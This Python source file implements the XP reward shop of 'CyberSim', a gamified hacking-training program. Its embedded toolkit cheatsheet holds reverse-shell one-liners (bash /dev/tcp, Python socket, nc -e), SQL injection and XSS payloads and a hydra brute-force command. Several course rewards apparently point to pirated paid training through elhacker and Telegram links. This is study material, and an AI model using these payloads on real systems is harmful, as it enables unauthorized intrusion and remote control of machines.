"""
CyberSim Reward Shop — Unlock rewards with XP.
Includes functional titles, resources, and the ultimate reward.
"""
import os, json

CYAN = "\033[96m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"
BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"; MAGENTA = "\033[95m"
BLUE = "\033[94m"

REWARDS = [
    {"id": "badge_script_kiddie", "cost": 500, "type": "title",
     "name": "🏅 Script Kiddie Badge",
     "desc": "Your first rank! Shows you're on the hacker path."},
    {"id": "cheatsheet_tools", "cost": 1500, "type": "resource",
     "name": "📜 Hacker Toolkit Cheatsheet",
     "desc": "Complete cheatsheet: Nmap, Burp, SQLmap, Hydra, Gobuster commands."},
    # ─── 💀 EXCLUSIVE ELHACKER COURSE REWARDS ─────────────────
    {"id": "elhacker_osint", "cost": 2000, "type": "course",
     "name": "💀 OSINT Fundamentals Course (EXCLUSIVE)",
     "desc": "Open-Source Intelligence: reconnaissance, data gathering, people tracing. NOT in any mission!"},
    {"id": "badge_pentester", "cost": 3000, "type": "title",
     "name": "🛡️ Penetration Tester Badge",
     "desc": "You've proven you can find and exploit real vulnerabilities."},
    {"id": "elhacker_android_hack", "cost": 4000, "type": "course",
     "name": "💀 Android Hacking & App Pentesting (EXCLUSIVE)",
     "desc": "Mobile hacking: APK reversing, Frida hooking, mobile pentesting. NOT in any mission!"},
    {"id": "theme_matrix", "cost": 5000, "type": "theme",
     "name": "🎨 Terminal Theme: Matrix Green",
     "desc": "Green-on-black Matrix-style terminal theme."},
    {"id": "elhacker_darkweb", "cost": 6500, "type": "course",
     "name": "💀 Dark Web & Anonymity Masterclass (EXCLUSIVE)",
     "desc": "Tor, I2P, hidden services, OPSEC — learn to navigate and investigate the dark web. NOT in any mission!"},
    {"id": "oscp_checklist", "cost": 8000, "type": "resource",
     "name": "📋 OSCP Prep Checklist",
     "desc": "Complete OSCP exam preparation checklist with study plan."},
    {"id": "elhacker_soc_analyst", "cost": 10000, "type": "course",
     "name": "💀 SOC Analyst Career Path (EXCLUSIVE)",
     "desc": "Cybrary SOC L1→L2→L3 path + EC-Council CSA. Full blue team career training. NOT in any mission!"},
    {"id": "badge_redteam", "cost": 12000, "type": "title",
     "name": "⚔️ Red Team Operator Badge",
     "desc": "You think like an attacker. Offensive security specialist."},
    {"id": "elhacker_reverse_eng", "cost": 14000, "type": "course",
     "name": "💀 Reverse Engineering with Ghidra & IDA (EXCLUSIVE)",
     "desc": "Binary analysis, decompilation, malware unpacking — IDA Pro + Ghidra mastery. NOT in any mission!"},
    # ─── LIMITED & VALUABLE REWARDS (hacker essentials) ───────
    {"id": "reverse_shell_book", "cost": 15000, "type": "resource",
     "name": "🔒 Reverse Shell Cookbook (LIMITED)",
     "desc": "Every reverse shell in every language: Bash, Python, PHP, PowerShell, Java, Ruby, Perl, Go, Rust."},
    {"id": "elhacker_flipper_zero", "cost": 17000, "type": "course",
     "name": "💀 Flipper Zero Hacking Course (EXCLUSIVE)",
     "desc": "RFID, NFC, Sub-GHz, IR, BadUSB — the ultimate hardware hacking toolkit. NOT in any mission!"},
    {"id": "theme_hacker", "cost": 18000, "type": "theme",
     "name": "🎨 Terminal Theme: Hacker Red",
     "desc": "Red-on-dark hacker terminal aesthetic."},
    {"id": "elhacker_cloud_redteam", "cost": 20000, "type": "course",
     "name": "💀 AWS Cloud Red Team Specialist (EXCLUSIVE)",
     "desc": "AWS CARTS + HackTricks ARTE: cloud exploitation, IAM abuse, Lambda backdoors. NOT in any mission!"},
    {"id": "exploit_toolkit", "cost": 22000, "type": "resource",
     "name": "🧰 Custom Exploit Toolkit Config (LIMITED)",
     "desc": "Pre-configured .msfconsole, .sqlmaprc, .hydra.conf, and Burp Extension list."},
    {"id": "badge_bounty", "cost": 25000, "type": "title",
     "name": "🏆 Bug Bounty Hunter Badge",
     "desc": "You could earn real money hunting bugs."},
    {"id": "elhacker_forensics", "cost": 28000, "type": "course",
     "name": "💀 SANS Forensics Collection (EXCLUSIVE)",
     "desc": "FOR508 + FOR585 + FOR572: advanced digital forensics, smartphone & network analysis. NOT in any mission!"},
    {"id": "wordlist_pack", "cost": 30000, "type": "resource",
     "name": "📦 Custom Recon Wordlist Pack (LIMITED)",
     "desc": "Curated wordlists: subdomains, dirs, passwords, usernames, API paths — tuned for real targets."},
    {"id": "elhacker_physical_redteam", "cost": 33000, "type": "course",
     "name": "💀 Physical Red Teaming & Social Engineering (EXCLUSIVE)",
     "desc": "Lockpicking, badge cloning, tailgating, phishing, vishing — the physical attack surface. NOT in any mission!"},
    {"id": "ctf_writeups", "cost": 35000, "type": "resource",
     "name": "📜 CTF Writeups Collection",
     "desc": "100+ real CTF writeups: web, crypto, pwn, forensics, reverse engineering."},
    {"id": "elhacker_cobalt_strike", "cost": 38000, "type": "course",
     "name": "💀 Red Team Ops with Cobalt Strike (EXCLUSIVE)",
     "desc": "Full C2 operations: beacon management, lateral movement, data exfil — the #1 red team tool. NOT in any mission!"},
    {"id": "pentest_report", "cost": 40000, "type": "resource",
     "name": "📋 Professional Pentest Report Template (LIMITED)",
     "desc": "Real pentest report template used by professionals. Markdown format with findings, evidence, risk ratings."},
    {"id": "vpn_config", "cost": 45000, "type": "resource",
     "name": "🌐 Privacy VPN Config Generator (LIMITED)",
     "desc": "OpenVPN + WireGuard config generator script. Multi-hop, kill switch, DNS leak protection."},
    {"id": "badge_master", "cost": 50000, "type": "ultimate",
     "name": "👑 CyberSim Master — Hall of Fame",
     "desc": "The ULTIMATE title. Unlocks the CyberSim Hall of Fame certificate."},
    {"id": "burp_alternative", "cost": 60000, "type": "resource",
     "name": "🔥 Burp Pro Alternative Setup Guide (LIMITED)",
     "desc": "Complete guide to set up Caido + mitmproxy + custom extensions as a free Burp Pro replacement."},
    {"id": "live_range", "cost": 75000, "type": "ultimate",
     "name": "🔥 CyberSim Live Fire Range Key",
     "desc": (
        "WORLD FIRST: Auto-generates a UNIQUE vulnerable network just for YOU.\n"
        "    Randomized multi-machine lab: Windows DC, Linux web, Docker,\n"
        "    IoT simulation — all with random vulns. Signed completion certificate."
     )},
    {"id": "zero_day_lab", "cost": 100000, "type": "ultimate",
     "name": "💎 Zero-Day Research Lab (ULTRA LIMITED)",
     "desc": (
        "THE RAREST REWARD IN CYBERSIM. Unlocks:\n"
        "    • Fuzzing lab with AFL++ and custom harnesses\n"
        "    • Vulnerable binaries for 0-day discovery practice\n"
        "    • Full exploit development toolkit (pwntools, ROPgadget, GDB-GEF)\n"
        "    • CVE writing template — write real vulnerability reports\n"
        "    • Only the top 1% of CyberSim players will ever reach this."
     )},
]


RESOURCE_FILES = {
    "cheatsheet_tools": """
╔══════════════════════════════════════════════════════════════╗
║              CYBERSIM HACKER TOOLKIT CHEATSHEET             ║
╚══════════════════════════════════════════════════════════════╝

─── RECONNAISSANCE ─────────────────────────────────────────
nmap -sC -sV -oN scan.txt <target>        # Full scan
nmap -p- --min-rate 5000 <target>          # All ports fast
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
ffuf -u <url>/FUZZ -w wordlist.txt         # Fuzzing
whois <domain> && dig <domain> any         # DNS recon

─── SQL INJECTION ──────────────────────────────────────────
sqlmap -u "<url>?id=1" --dbs              # Find databases
sqlmap -u "<url>" --forms --batch          # Auto-detect forms
' OR '1'='1'--                             # Auth bypass
' UNION SELECT null,null,null--            # Column count

─── XSS ────────────────────────────────────────────────────
<script>alert(document.cookie)</script>    # Basic
<img src=x onerror=alert(1)>              # IMG tag
<svg onload=alert(1)>                      # SVG tag

─── PASSWORD CRACKING ──────────────────────────────────────
hydra -l admin -P rockyou.txt <ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
john --wordlist=rockyou.txt hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt    # MD5

─── REVERSE SHELLS ─────────────────────────────────────────
bash -i >& /dev/tcp/<ip>/4444 0>&1
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("<ip>",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
nc -e /bin/sh <ip> 4444

─── PRIVILEGE ESCALATION ───────────────────────────────────
sudo -l                                    # Check sudo perms
find / -perm -4000 2>/dev/null            # SUID binaries
cat /etc/crontab                           # Cron jobs
linpeas.sh / winpeas.exe                   # Auto-enum
""",
    "oscp_checklist": """
╔══════════════════════════════════════════════════════════════╗
║                    OSCP PREPARATION CHECKLIST                ║
╚══════════════════════════════════════════════════════════════╝

MONTH 1-2: FOUNDATIONS
  [ ] Complete OverTheWire Bandit (Linux basics)
  [ ] Learn Bash scripting
  [ ] Master Nmap scanning
  [ ] Practice with HackTheBox Easy machines
  [ ] Study networking (TCP/IP, DNS, HTTP)

MONTH 3-4: WEB EXPLOITATION
  [ ] Complete PortSwigger Labs (SQL, XSS, CSRF)
  [ ] Practice on OWASP Juice Shop / CyberSim VulnSite
  [ ] Learn Burp Suite thoroughly
  [ ] Study file upload, LFI, RFI, SSRF

MONTH 5-6: SYSTEM EXPLOITATION
  [ ] Study Buffer Overflows (simple stack-based)
  [ ] Practice privilege escalation (Linux + Windows)
  [ ] Complete TryHackMe offensive paths
  [ ] Build your own methodology document

MONTH 7-8: ACTIVE DIRECTORY
  [ ] Learn AD enumeration (BloodHound, PowerView)
  [ ] Practice Kerberoasting, Pass-the-Hash
  [ ] Study lateral movement techniques
  [ ] Complete HackTheBox Pro Labs

MONTH 9-10: PRACTICE EXAMS
  [ ] Take 5-machine practice exams (24-hour format)
  [ ] Time yourself on HackTheBox machines
  [ ] Write full pentest reports for each machine
  [ ] Review and refine your methodology

EXAM DAY CHECKLIST:
  [ ] VPN connection tested
  [ ] Screenshots tool ready (Flameshot)
  [ ] Note-taking organized (CherryTree/Obsidian)
  [ ] Snacks and caffeine prepared
  [ ] 24 hours of focus — you've got this!
""",
    "ctf_writeups": """
╔══════════════════════════════════════════════════════════════╗
║               CTF WRITEUPS COLLECTION (TOP 100)              ║
╚══════════════════════════════════════════════════════════════╝

This collection is unlocked! Access writeups at:
  → /cybersim/rewards/ctf_writeups/

Categories include:
  [WEB]     SQL Injection chains, XSS to RCE, SSRF bypasses
  [CRYPTO]  RSA attacks, AES-CBC padding oracle, hash collisions
  [PWN]     Buffer overflow, ROP chains, format strings
  [REVERSE] Binary analysis, obfuscation, anti-debug
  [FORENSIC] Memory forensics, disk analysis, network captures
  [MISC]    OSINT, steganography, blockchain analysis

Topics covered:
  • Real HackTheBox machine walkthroughs (50 machines)
  • PicoCTF 2024-2025 solutions
  • Real-world bug bounty reports (anonymized)
  • Interview-style security challenges
""",
}

# ─── 💀 EXCLUSIVE ELHACKER COURSE DOWNLOAD LINKS ──────────────────────────────
# Loaded from db/reward_courses.json (editable without code changes).
# To add new links: edit db/reward_courses.json
# Supports platforms: telegram, gdrive, elhacker, web, youtube

REWARD_COURSES_FILE = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "db", "reward_courses.json"
)


def _load_course_links() -> dict:
    """Load course links from external JSON file. Falls back to empty dict."""
    if os.path.exists(REWARD_COURSES_FILE):
        try:
            with open(REWARD_COURSES_FILE, "r") as f:
                data = json.load(f)
                # Remove metadata keys
                return {k: v for k, v in data.items() if not k.startswith("_")}
        except Exception:
            pass
    return {}


# Load once at import time, can be refreshed by calling _load_course_links()
COURSE_LINKS = _load_course_links()


def get_active_title(state: dict) -> str:
    """Get the user's active title badge."""
    return state.get("active_title", "Recruit")


def reward_shop(state: dict) -> dict:
    """Display the reward shop and handle purchases."""
    xp = state.get("xp", 0)
    unlocked = state.get("unlocked_rewards", [])

    while True:
        print(f"\n{BOLD}╔══════════════════════════════════════════════════════════╗{RESET}")
        print(f"{BOLD}║        🏪 CYBERSIM REWARD SHOP                          ║{RESET}")
        print(f"{BOLD}╚══════════════════════════════════════════════════════════╝{RESET}")
        print(f"  {CYAN}Your XP: {BOLD}{xp}{RESET}  |  Title: {GREEN}{get_active_title(state)}{RESET}")
        print(f"  {DIM}Unlocked: {len(unlocked)}/{len(REWARDS)}{RESET}\n")

        for i, r in enumerate(REWARDS, 1):
            owned = r["id"] in unlocked
            if owned:
                status = f"{GREEN}[OWNED]{RESET}"
            elif xp >= r["cost"]:
                status = f"{YELLOW}[AVAILABLE]{RESET}"
            else:
                need = r["cost"] - xp
                status = f"{RED}[LOCKED — need {need} more XP]{RESET}"
            print(f"  {CYAN}[{i:2d}]{RESET} {r['name']}  {status}")
            print(f"       {DIM}Cost: {r['cost']} XP | {r['desc']}{RESET}")
            print()

        print(f"  {DIM}[b] Back to Main Menu{RESET}")
        choice = input(f"\n{CYAN}Buy reward [1-{len(REWARDS)}] or [b]: {RESET}").strip()

        if choice.lower() == "b":
            break

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(REWARDS):
                r = REWARDS[idx]
                if r["id"] in unlocked:
                    print(f"  {GREEN}[✓] You already own this!{RESET}")
                    if r["type"] == "title":
                        state["active_title"] = r["name"]
                        print(f"  {GREEN}Title set to: {r['name']}{RESET}")
                    elif r["type"] == "course" and r["id"] in COURSE_LINKS:
                        _show_course_links(r["id"])
                elif xp >= r["cost"]:
                    state["xp"] = xp - r["cost"]
                    xp = state["xp"]
                    unlocked.append(r["id"])
                    state["unlocked_rewards"] = unlocked
                    print(f"\n  {GREEN}{BOLD}🎉 UNLOCKED: {r['name']}{RESET}")
                    print(f"  {DIM}-{r['cost']} XP | Remaining: {xp} XP{RESET}")

                    if r["type"] == "title":
                        state["active_title"] = r["name"]
                        print(f"  {GREEN}Title set to: {r['name']}{RESET}")
                    elif r["type"] == "resource" and r["id"] in RESOURCE_FILES:
                        # Save resource file
                        rewards_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rewards")
                        os.makedirs(rewards_dir, exist_ok=True)
                        filepath = os.path.join(rewards_dir, f"{r['id']}.txt")
                        with open(filepath, "w") as f:
                            f.write(RESOURCE_FILES[r["id"]])
                        print(f"  {GREEN}📄 Saved to: {filepath}{RESET}")
                    elif r["type"] == "course" and r["id"] in COURSE_LINKS:
                        _show_course_links(r["id"])
                    elif r["type"] == "ultimate" and r["id"] == "badge_master":
                        _hall_of_fame(state)
                    elif r["type"] == "ultimate" and r["id"] == "live_range":
                        print(f"\n  {MAGENTA}{BOLD}🔥 LIVE FIRE RANGE UNLOCKED!{RESET}")
                        print(f"  {DIM}A unique vulnerable network will be generated for you.{RESET}")
                        print(f"  {DIM}This feature generates randomized multi-machine labs.{RESET}")
                else:
                    print(f"  {RED}[!] Not enough XP. Need {r['cost'] - xp} more.{RESET}")
        except ValueError:
            print(f"  {RED}[!] Invalid choice.{RESET}")

    return state


def _show_course_links(course_id: str):
    """Display download links for an exclusive course reward."""
    # Refresh from JSON in case user edited the file
    global COURSE_LINKS
    COURSE_LINKS = _load_course_links()

    course = COURSE_LINKS.get(course_id, {})
    title = course.get("title", "Unknown Course")
    links = course.get("links", [])

    print(f"\n  {BOLD}💀 EXCLUSIVE COURSE: {title}{RESET}")
    print(f"  {'─' * 55}")
    print(f"  {DIM}Download links (elhacker.INFO / Telegram / GDrive):{RESET}\n")

    for i, link in enumerate(links, 1):
        # Support both dict format (JSON) and tuple format (legacy)
        if isinstance(link, dict):
            name = link.get("name", "Unknown")
            url = link.get("url", "")
            platform = link.get("platform", "elhacker")
        else:
            name, url = link[0], link[1]
            platform = "elhacker"

        icon = {"telegram": "📱", "gdrive": "📁", "elhacker": "💀",
                "web": "🌐", "youtube": "▶️"}.get(platform, "📄")
        print(f"  {icon} {CYAN}{i}.{RESET} {BOLD}{name}{RESET}")
        print(f"     {BLUE}{url}{RESET}")
        print()

    print(f"  {DIM}💡 Copy-paste any link above into your browser to access.{RESET}")
    print(f"  {DIM}   These courses are EXCLUSIVE — not available in missions!{RESET}")
    print(f"  {DIM}   To add more links: edit db/reward_courses.json{RESET}")

    # Also save to file for easy access
    rewards_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rewards")
    os.makedirs(rewards_dir, exist_ok=True)
    filepath = os.path.join(rewards_dir, f"{course_id}_links.txt")
    with open(filepath, "w") as f:
        f.write(f"💀 EXCLUSIVE COURSE: {title}\n")
        f.write(f"{'=' * 55}\n\n")
        for link in links:
            if isinstance(link, dict):
                f.write(f"• {link.get('name', '')} [{link.get('platform', '')}]\n  {link.get('url', '')}\n\n")
            else:
                f.write(f"• {link[0]}\n  {link[1]}\n\n")
    print(f"  {GREEN}📄 Links saved to: {filepath}{RESET}")


def _hall_of_fame(state: dict):
    """Display the Hall of Fame certificate."""
    name = state.get("username", "CyberWarrior")
    print(f"""
{MAGENTA}{'═'*60}
║                                                          ║
║     ╔══════════════════════════════════════════════╗     ║
║     ║                                              ║     ║
║     ║   🏆  CYBERSIM HALL OF FAME CERTIFICATE  🏆  ║     ║
║     ║                                              ║     ║
║     ║   This certifies that                        ║     ║
║     ║                                              ║     ║
║     ║     {BOLD}{name:^38}{RESET}{MAGENTA}     ║     ║
║     ║                                              ║     ║
║     ║   has completed ALL challenges in CyberSim   ║     ║
║     ║   and earned the title of CYBERSIM MASTER    ║     ║
║     ║                                              ║     ║
║     ║   XP Earned: {state.get('xp',0):>8}                       ║     ║
║     ║   Days Trained: {state.get('current_day',1):>5}                     ║     ║
║     ║                                              ║     ║
║     ╚══════════════════════════════════════════════╝     ║
║                                                          ║
{'═'*60}{RESET}""")
